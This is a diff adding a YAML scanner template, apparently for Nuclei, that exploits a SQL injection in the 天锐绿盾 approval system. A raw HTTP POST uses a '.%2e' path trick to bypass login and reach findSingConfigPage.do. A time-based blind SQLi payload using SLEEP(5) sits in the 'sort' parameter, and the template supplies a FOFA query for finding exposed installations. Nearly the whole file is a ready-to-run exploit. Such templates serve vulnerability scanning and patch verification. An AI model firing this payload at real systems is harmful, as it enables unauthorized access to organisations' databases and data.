@@ -1,0 +1,41 @@
+id: poc-bg8zg8vpvyfzihya
+info:
+  name: 天锐绿盾审批系统 findSingConfigPage 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bg8zg8vpvyfzihya
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bg8zg8vpvyfzihya
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/login.jsp/.%2e/thirdSystemConfig/findSingConfigPage.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Priority: u=1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    sort=app_id%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(5)))UPad)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
